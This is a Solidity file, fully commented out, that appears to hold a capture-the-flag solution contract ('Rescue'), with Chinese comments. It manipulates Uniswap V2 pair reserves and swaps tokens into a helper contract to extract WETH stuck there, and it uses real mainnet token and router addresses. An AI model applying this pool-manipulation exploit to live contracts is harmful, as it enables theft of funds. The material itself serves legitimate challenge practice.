pragma solidity 0.8.16;
/*
contract Rescue {
    UniswapV2RouterLike public router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    WETH9 public weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    ERC20Like public usdc = ERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IPair public usdcweth = IPair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    IPair public usdtweth = IPair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);

    constructor() payable {}

    function rescue(address setup) public {
        // 获取误转入10WETH的合约实例
        address target = ISetup(setup).mcHelper();
        
        // 本合约获得11WETH，因为是1：1兑换
        weth.deposit{value: 11 ether}();
        // 向 USDT/WETH 池子转10WETH
        weth.transfer(address(usdtweth), 10 ether);
        // 向 USDC/WETH 池子转1WETH
        weth.transfer(address(usdcweth), 1 ether);

        // 获取池子的两个token的比例，reserveUSDT是池子中剩余的USDT数量，reserveWETH是池子中剩余的WETH数量
        (uint112 reserveUSDT, uint112 reserveWETH, ) = usdtweth.getReserves();
        // 用10个WETH换取若干个USDT
        uint256 amount = router.getAmountOut(10 ether, reserveWETH, reserveUSDT);
        // USDT/WETH 池子中，用WETH换USDT，结果是得到amount数量的USDT
        usdtweth.swap(amount, 0, target, "");

        // 获取池子的两个token的比例，reserveWETH是池子中剩余的WETH数量，reserveUSDC是池子中剩余的USDC数量
        (reserveWETH, uint112 reserveUSDC, ) = usdcweth.getReserves();
        // 用1个WETH换取若干个USDC
        amount = router.getAmountOut(1 ether, reserveWETH, reserveUSDC);
        // WETH/USDC 池子中，用WETH换USDC，结果是得到amount数量的USDC
        usdcweth.swap(0, amount, address(this), "");

        // 要授权，这样池子才能转走你的USDC
        usdc.approve(target, usdc.balanceOf(address(this)));
        // 1是指第一个交易对，即USDT/WETH，将USDC放入然后对半分
        IMasterChefHelper(target).swapTokenForPoolToken(1, address(usdc), usdc.balanceOf(address(this)), 0);
    }
}

*/